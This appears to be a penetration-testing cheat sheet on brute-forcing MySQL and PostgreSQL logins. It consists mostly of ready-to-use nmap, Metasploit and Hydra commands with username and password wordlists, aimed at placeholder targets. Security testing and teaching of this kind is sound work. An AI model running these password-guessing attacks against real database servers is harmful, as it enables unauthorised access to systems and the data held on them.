# Brute-force databases

## Nmap

`nmap` uses default password and user lists, but do plug in other lists:

### MySQL
Reduce the pool of users for the brute-force attack by [user enumeration](../enumeration/databases.md).

```text
# nmap --script mysql-brute <target>
--script-args userdb=<path> - plug in list of logins
--script-args passdb=<path> - plug in list of passwords
```

### PostgreSQL
```text
# nmap -p 5432 --script pgsql-brute <target>
```

## Metasploit

### MySQL
```text
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set USER_FILE /root/login/logins
msf auxiliary(mysql_login) > set PASS_FILE /root/login/password
msf auxiliary(mysql_login) > set RHOSTS <target>
msf auxiliary(mysql_login) > exploit
```

### PostgreSQL
```text
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > set BLANK_PASSWORDS True
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS True
msf auxiliary(postgres_login) > set threads 100
msf auxiliary(postgres_login) > set RHOSTS <target>
msf auxiliary(postgres_login) > run
```

## Hydra

### PostgreSQL

```text
# hydra -L /path/to/user.txt -P /path/to/pass.txt <target> postgres
# hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt <target> postgres
-L: path for username list
-P: path for the password list
```

## Resources

* [SecLists](https://github.com/danielmiessler/SecLists)
* [Script pgsql-brute](https://nmap.org/nsedoc/scripts/pgsql-brute.html)
* [Script mysql-brute](https://nmap.org/nsedoc/scripts/mysql-brute.html)